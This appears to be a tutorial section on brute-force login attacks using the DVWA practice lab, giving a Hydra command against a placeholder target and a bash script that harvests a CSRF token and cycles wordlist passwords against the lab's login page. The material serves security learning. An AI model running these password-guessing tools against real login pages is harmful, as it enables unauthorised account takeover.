## 1. Brute Force Attack

![](https://pimages.toolbox.com/wp-content/uploads/2022/05/10131245/Critical-Steps-of-a-Brute-Force-Attack.png)
>We will use DVWA Labs To Learn Bruteforce Attacks

>We will use hydra and custom bash script to perform bruteforce attack

**Hydra**
```
hydra target.com -V -l username -P "worldlists.txt" http-get-form "/path:formusername=^USER^&formpassword=^PASS^&FormLogin=Login:F=Fail Message:H=Cookie: Cookies"
```

**BASH Script**
```
#!/usr/bin/bash
crack() {
token=$(curl -s --cookie "PHPSESSID=d9bhskt5gc3jmctc1eilhr56e6; security=high"  "http://localhost/vulnerabilities/brute/" | grep user_token  | grep -oP "value='\K[^']+")
html_codes=$(curl -s --cookie "PHPSESSID=d9bhskt5gc3jmctc1eilhr56e6; security=high"  "http://localhost/vulnerabilities/brute/?username=admin&password=$1&Login=Login&user_token=$token")
if [[ $(echo "${html_codes}" | grep -i "Welcome to the password protected area admin") ]];then
echo "Success"
exit
else
echo "Failed"
fi
}
while IFS= read -r passwords;do
echo "Trying... ($passwords)"
crack $passwords
done < /usr/share/wordlists/fasttrack.txt
```
